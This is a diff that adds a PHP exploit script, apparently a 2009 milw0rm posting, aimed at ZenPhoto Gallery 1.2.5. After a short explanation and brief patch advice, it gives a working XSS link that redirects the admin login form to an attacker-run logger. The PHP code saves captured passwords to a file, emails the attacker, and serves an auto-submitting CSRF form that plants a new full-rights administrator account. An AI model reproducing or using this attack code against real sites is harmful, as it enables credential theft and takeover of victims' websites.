@@ -1,0 +1,149 @@
+<?php
+####################################################################
+#     Zen Photo Adminstrator Password Steal/Reset Exploit          #
+#+================================================================+#
+#     Discovered and coded by petros [at] dusecurity.com           #
+#+----------------------------------------------------------------+#
+#     Affects: ZenPhoto Gallery 1.2.5		                   #
+#+----------------------------------------------------------------+#
+# Zenphoto is an answer to lots of calls for an online             #
+# gallery solution that just makes sense. After years of           #
+# bloated software that does everything and your dishes,           #
+# zenphoto just shows your photos, simply. It’s got all the        #  
+# functionality and “features” you need, and nothing you don’t.    #
+# Where the old guys put in a bunch of modules and junk, we put    #
+# a lot of thought. We hope you agree with our philosopy:          #
+# simpler is better. Don’t get us wrong though –zenphoto really    #
+# does have everything you need for your online gallery.           #
+#+================================================================+#
+#	Exploit Explaination				           #
+#+================================================================+#
+#                                                                  #
+# This exploit actually advantage of two vulnerabilities.          #
+# The first exploit is a simple XSS in the admin login page        #
+# that will allow us to log the admins password. Unfortunatly,     #
+# it only executes if the admin is NOT already logged in.          #
+# The second is a CRSF exploit that allows you to change the       #
+# admins password by automatically submitting a form.              #
+# This exploit only works if the admin already logged in.          #
+# Combine these and we have two ways to gain admin access          #
+#                                                                  #
+#+--------------------------------------------------------------=-+#
+# How to patch/prevent these vulnernabilities                      #
+#+--------------------------------------------------------------=-+#
+#                                                                  #
+# The XSS in the zp-core/admin.php page can be patched by          #
+# santizing the $_GET['from'] variable before outputting it        #
+#                                                                  #
+# The CRSF requires either some form of referal checking or        #
+# hidden security token on all forms (the latter would be better   #
+#                                                                  #
+#+----------------------------------------------------------------+#
+# How to use this exploit to take over a ZenPhoto website          #
+#+----------------------------------------------------------------+#
+#                                                                  #
+# To use the XSS logger make the admin click this link:            #
+#                                                                  #
+#+--[code snippet - put this all in one line]--+                   #
+# http://victimsite.com/zp-core/admin.php?from="><script>          #
+# document.forms[0].action="[logged url]";                         #
+# </script><div id="lolpwnt                                        #
+#+--[ end of code snippet]--+                                      #
+#                                                                  #
+# Replace [logger url] with the link to this PHP script            #
+# Make sure your log.txt is writable before doing this             #
+# On login the admins password will be saved to the file.          #
+#                                                                  #
+# The next exploit is used by simply giving the link to            #
+# this script to the admin. if he clicks it his password           #
+# will be changed automatically to "ownedbydusec"                  #
+#                                                                  #
+# That's about it :) Enjoy!                                        #
+####################################################################
+#            petros [at] dusecurity [dot] com                      #
+####################################################################
+
+
+//* Configure the exploit *//
+$site = "http://victim.org/zen-photo";  // URL to vulnerable ZP install (no trailing slash!!)
+$log = "log.txt";			// File to save logs to
+$user = "admin";			// Name of the new admin
+$pass = "ownedbydusec";			// New admin pass
+$email = "you@site.com";		// Email to send log notifications to
+// Do not edit below this line...
+
+if($_POST)// We got logins from the XSS phisher
+{
+	$file = fopen($log, 'a');
+	if(!$file) redirect();
+	fwrite($file,"--==[{$_SERVER['REMOTE_ADDR']}]==--\r\n");
+	foreach($_POST as $key => $value)
+		fwrite($file, "$key = $value\r\n");
+	fwrite($file,"\r\n");
+	fclose($file);
+	@mail($email, "ZenPhoto Double Penetration Exploit got a password!", "Please check your log file :)");
+	redirect(); //send the back to the admin page
+	
+}
+else // try to create a new admin using CRSF
+{
+	$inputs = array(
+"saveadminoptions" => "true", 
+
+"totaladmins" => "1", 
+
+"alter_enabled" => "1", 
+
+"0-adminuser" => $user, 
+
+"0-confirmed" => "2", 
+
+"0-adminpass" => $pass, 
+
+"0-adminpass_2" => $pass, 
+
+"0-admin_rights" => "1", 
+
+"0-options_rights" => "1", 
+
+"0-zenpage_rights" => "1", 
+
+"0-tags_rights" => "1", 
+
+"0-themes_rights" => "1", 
+
+"0-all_album_rights" => "1", 
+
+"0-edit_rights" => "1", 
+
+"0-comment_rights" => "1", 
+
+"0-upload_rights" => "1", 
+
+"0-view_rights" => "1", 
+
+"0-main_rights" => "1", 
+
+"0-admin_name" => "Owned by dusecurity.com", 
+
+"0-admin_email" => 'petros was here &lt;3'
+);
+	$action = $site."/zp-core/admin-options.php?action=saveoptions";
+	echo "<html><head><script>function badboy(){ document.forms[0].submit();{</script></head>";
+	echo "<body onload=\"badboy();\"><form action=\"$action\" method=\"POST\">";
+	foreach($inputs as $key => $value)
+	{
+		echo "<input name=\"$key\" value=\"$value\" type=\"hidden\" />";
+	}
+	echo '<input type="submit" value="Click Me!" />'; //not that they have a choice lol
+	echo "</form></body></html>";
+	// notify them by e-mail because the admin will probably notice he cant login
+	@mail($email,"ZenPhoto Double Penetration Exploit Success!", "Site: $site/zp-core/admin.php\nUsername: $user\nPassword: $pass");
+}
+
+
+function redirect(){ header("Location: $site/zp-core/admin.php");exit; }
+
+?>
+
+# milw0rm.com [2009-07-16]
